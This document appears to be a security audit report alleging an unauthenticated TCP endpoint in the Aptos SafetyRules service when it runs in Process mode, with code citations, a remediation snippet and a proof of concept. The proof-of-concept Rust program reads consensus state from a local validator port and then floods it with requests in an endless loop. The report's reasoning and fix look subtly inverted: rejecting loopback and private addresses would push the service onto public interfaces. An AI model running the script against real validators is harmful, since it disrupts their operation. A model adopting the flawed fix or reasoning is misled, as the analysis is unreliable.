# Audit Report

## Title
Safety Rules Service Exposes Unauthenticated TCP Endpoint Due to Missing Address Validation in server_address()

## Summary
The `server_address()` function in `RemoteService` does not validate that the resolved network address is not localhost, a private IP, or other dangerous destinations. When SafetyRules is configured in Process mode (allowed on testnet/devnet), this creates an unauthenticated TCP service accessible to local attackers or network peers, enabling denial-of-service attacks and information disclosure. [1](#0-0) 

## Finding Description

The SafetyRules component is critical to Aptos consensus security, enforcing voting rules and preventing equivocation. It can operate in several modes, including `Process` mode where it runs as a separate service with network communication.

When configured with `SafetyRulesService::Process`, the system uses the `RemoteService::server_address()` function to resolve the configured network address: [1](#0-0) 

This function performs DNS resolution via `to_socket_addrs()` but applies **no validation** to prevent dangerous addresses. The implementation in `NetworkAddress::to_socket_addrs()` only filters by IP version (IPv4 vs IPv6), not by address type: [2](#0-1) 

The resolved address is then used to start an **unauthenticated TCP server** that accepts connections from any client: [3](#0-2) 

The underlying `NetworkServer` implementation provides no authentication, authorization, or IP filtering: [4](#0-3) 

**Attack Scenario:**
1. A testnet/devnet validator is configured with `SafetyRulesService::Process` and a NetworkAddress like `/ip4/127.0.0.1/tcp/6191` or `/dns/localhost/tcp/6191`
2. The safety rules service binds to this address without validation
3. Any local process or network attacker (for private IPs) can connect to this TCP service
4. The attacker can send JSON-serialized `SafetyRulesInput` messages: [5](#0-4) 

**What attackers can achieve:**
- **Information Disclosure**: Read consensus state via `ConsensusState` messages
- **Denial of Service**: Spam requests to block or delay legitimate consensus operations
- **Validator Performance Degradation**: Interfere with safety rules operations through race conditions or resource exhaustion

**Protection Limitations:**
While SafetyRules has internal protections against equivocation (voting rules, round tracking), these don't prevent the attack surface created by the unauthenticated service. MainNet deployments are protected by a config sanitizer that enforces Local mode: [6](#0-5) 

However, testnet, devnet, and private network deployments remain vulnerable.

## Impact Explanation

**Severity: Medium**

Per Aptos bug bounty criteria:
- **Not Critical**: Cannot directly steal funds or break consensus safety due to SafetyRules' internal voting rule protections
- **Potentially High**: "Validator node slowdowns" is listed as High severity, but this requires specific misconfiguration
- **Medium**: "State inconsistencies requiring intervention" - The DoS attacks could require validator restart/intervention, and information disclosure compromises validator operations

The vulnerability allows:
1. **DoS on testnet/devnet validators**: Disrupting consensus participation
2. **Information disclosure**: Exposing internal consensus state
3. **Operational security degradation**: Creating unnecessary attack surface on security-critical infrastructure

## Likelihood Explanation

**Likelihood: Medium-Low**

Required conditions:
1. Validator must be configured with `SafetyRulesService::Process` (non-default)
2. Server address must resolve to localhost or private IP (misconfiguration)
3. Attacker must have local or network access to the exposed address

Mitigating factors:
- MainNet validators cannot use Process mode (enforced by sanitizer)
- Default configuration uses Local mode (not vulnerable)
- Most validators would configure remote addresses, not localhost

However, testnet/devnet environments commonly use simplified configurations that may expose localhost addresses, and private deployments may use internal IPs without proper network segmentation.

## Recommendation

Add address validation to `RemoteService::server_address()` to reject localhost, private IPs, and other dangerous destinations:

```rust
pub fn server_address(&self) -> Result<SocketAddr, Error> {
    let addr = self.server_address
        .to_socket_addrs()
        .map_err(|e| Error::InvalidServerAddress(format!("DNS resolution failed: {}", e)))?
        .next()
        .ok_or_else(|| Error::InvalidServerAddress("No addresses resolved".to_string()))?;
    
    // Validate address is not localhost or private IP
    if addr.ip().is_loopback() {
        return Err(Error::InvalidServerAddress(
            "Server address cannot be localhost (127.0.0.1/::1)".to_string()
        ));
    }
    
    if is_private_ip(addr.ip()) {
        return Err(Error::InvalidServerAddress(
            "Server address cannot be a private IP (RFC 1918)".to_string()
        ));
    }
    
    if addr.ip().is_unspecified() {
        return Err(Error::InvalidServerAddress(
            "Server address cannot be unspecified (0.0.0.0/::)".to_string()
        ));
    }
    
    Ok(addr)
}

fn is_private_ip(ip: IpAddr) -> bool {
    match ip {
        IpAddr::V4(ipv4) => {
            ipv4.is_private() || 
            ipv4.octets()[0] == 10 ||
            (ipv4.octets()[0] == 172 && ipv4.octets()[1] >= 16 && ipv4.octets()[1] <= 31) ||
            (ipv4.octets()[0] == 192 && ipv4.octets()[1] == 168)
        },
        IpAddr::V6(ipv6) => {
            ipv6.is_unique_local() || ipv6.is_unicast_link_local()
        }
    }
}
```

Additionally, consider implementing authentication for the Process mode service using mutual TLS or the existing Noise protocol.

## Proof of Concept

```rust
// Attacker code to connect to exposed safety rules service
use std::net::TcpStream;
use std::io::{Write, Read};

fn main() {
    // Connect to misconfigured safety rules service
    let mut stream = TcpStream::connect("127.0.0.1:6191")
        .expect("Failed to connect");
    
    // Craft ConsensusState request (information disclosure)
    let request = serde_json::to_vec(&SafetyRulesInput::ConsensusState)
        .expect("Failed to serialize");
    
    // Send length-prefixed message (NetworkStream protocol)
    let len = (request.len() as u32).to_le_bytes();
    stream.write_all(&len).expect("Failed to write length");
    stream.write_all(&request).expect("Failed to write request");
    
    // Read response length
    let mut len_bytes = [0u8; 4];
    stream.read_exact(&mut len_bytes).expect("Failed to read length");
    let response_len = u32::from_le_bytes(len_bytes) as usize;
    
    // Read response data (consensus state exposed)
    let mut response = vec![0u8; response_len];
    stream.read_exact(&mut response).expect("Failed to read response");
    
    println!("Leaked consensus state: {:?}", response);
    
    // DoS: Spam requests to degrade validator performance
    loop {
        stream.write_all(&len).expect("Failed to write");
        stream.write_all(&request).expect("Failed to write");
    }
}
```

**Validator Configuration (vulnerable):**
```yaml
consensus:
  safety_rules:
    service:
      type: "process"
      server_address: "/ip4/127.0.0.1/tcp/6191"  # VULNERABLE: localhost exposed
```

## Notes

- This vulnerability only affects non-mainnet deployments due to the config sanitizer enforcement
- Defense-in-depth: Even with SafetyRules' internal protections, exposing unauthenticated services is a security anti-pattern
- The lack of address validation violates the principle of least privilege and creates unnecessary attack surface
- Consider deprecating Process mode entirely or requiring authentication for production use

### Citations

**File:** config/src/config/safety_rules_config.rs (L99-104)
```rust
            if chain_id.is_mainnet() && !safety_rules_config.service.is_local() {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    format!("The safety rules service should be set to local in mainnet for optimal performance! Given config: {:?}", &safety_rules_config.service)
                ));
            }
```

**File:** config/src/config/safety_rules_config.rs (L232-238)
```rust
    pub fn server_address(&self) -> SocketAddr {
        self.server_address
            .to_socket_addrs()
            .expect("server_address invalid")
            .next()
            .expect("server_address invalid")
    }
```

**File:** types/src/network_address/mod.rs (L470-486)
```rust
impl ToSocketAddrs for NetworkAddress {
    type Iter = std::vec::IntoIter<SocketAddr>;

    fn to_socket_addrs(&self) -> Result<Self::Iter, std::io::Error> {
        if let Some(((ipaddr, port), _)) = parse_ip_tcp(self.as_slice()) {
            Ok(vec![SocketAddr::new(ipaddr, port)].into_iter())
        } else if let Some(((ip_filter, dns_name, port), _)) = parse_dns_tcp(self.as_slice()) {
            format!("{}:{}", dns_name, port).to_socket_addrs().map(|v| {
                v.filter(|addr| ip_filter.matches(addr.ip()))
                    .collect::<Vec<_>>()
                    .into_iter()
            })
        } else {
            Ok(vec![].into_iter())
        }
    }
}
```

**File:** consensus/safety-rules/src/remote_service.rs (L30-45)
```rust
pub fn execute(storage: PersistentSafetyStorage, listen_addr: SocketAddr, network_timeout_ms: u64) {
    let mut safety_rules = SafetyRules::new(storage, false);
    if let Err(e) = safety_rules.consensus_state() {
        warn!("Unable to print consensus state: {}", e);
    }

    let mut serializer_service = SerializerService::new(safety_rules);
    let mut network_server =
        NetworkServer::new("safety-rules".to_string(), listen_addr, network_timeout_ms);

    loop {
        if let Err(e) = process_one_message(&mut network_server, &mut serializer_service) {
            warn!("Failed to process message: {}", e);
        }
    }
}
```

**File:** secure/net/src/lib.rs (L280-289)
```rust
impl NetworkServer {
    pub fn new(service: String, listen: SocketAddr, timeout_ms: u64) -> Self {
        let listener = TcpListener::bind(listen);
        Self {
            service,
            listener: Some(listener.unwrap()),
            stream: None,
            timeout_ms,
        }
    }
```

**File:** consensus/safety-rules/src/serializer.rs (L22-34)
```rust
#[derive(Clone, Debug, Deserialize, Serialize)]
pub enum SafetyRulesInput {
    ConsensusState,
    Initialize(Box<EpochChangeProof>),
    SignProposal(Box<BlockData>),
    SignTimeoutWithQC(
        Box<TwoChainTimeout>,
        Box<Option<TwoChainTimeoutCertificate>>,
    ),
    ConstructAndSignVoteTwoChain(Box<VoteProposal>, Box<Option<TwoChainTimeoutCertificate>>),
    ConstructAndSignOrderVote(Box<OrderVoteProposal>),
    SignCommitVote(Box<LedgerInfoWithSignatures>, Box<LedgerInfo>),
}
```
